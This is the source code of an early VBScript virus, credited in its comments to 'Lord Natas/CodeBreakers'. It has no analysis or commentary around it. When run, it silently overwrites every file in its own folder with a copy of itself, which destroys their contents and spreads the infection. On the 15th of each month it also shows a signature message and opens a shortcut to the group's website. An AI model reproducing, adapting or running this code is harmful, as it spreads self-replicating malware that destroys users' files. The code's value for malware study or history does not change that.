'VBSv Version 2.0 by Lord Natas/CodeBreakers
'First Windows Scripting Virus

On Error Resume Next

Set WshShell = Wscript.CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

parent = Wscript.ScriptFullName
vPath = Left(parent, InStrRev(parent, "\"))

For Each target in FSO.GetFolder(vPath).Files
    FSO.CopyFile parent, target.Name, 1
Next

If Day(Now()) = 15 Then

  WScript.Echo "VBSv v2.0" & Chr(13) & "by Lord Natas/CodeBreakers"

  Set oUrlLink = WshShell.CreateShortcut("CB.URL")
  oUrlLink.TargetPath = "http://www.codebreakers.org"
  oUrlLink.Save

  WshShell.Run ("CB.URL")

End If
